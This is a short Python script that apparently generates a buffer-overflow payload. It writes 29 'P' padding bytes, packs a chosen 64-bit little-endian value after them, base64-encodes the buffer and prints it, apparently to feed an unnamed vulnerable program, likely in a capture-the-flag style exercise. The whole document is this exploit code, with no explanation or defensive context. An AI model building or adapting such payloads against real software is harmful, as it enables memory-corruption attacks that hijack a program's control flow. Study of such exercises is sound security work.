
import sys
import struct
import base64

buf = b'PPPPPPPPPPPPPPPPPPPPPPPPPPPPP'
buf += struct.pack('<Q', 10652310372634696090)
buf = base64.b64encode(buf)
buf += b'\n'

sys.stdout.buffer.write(buf)
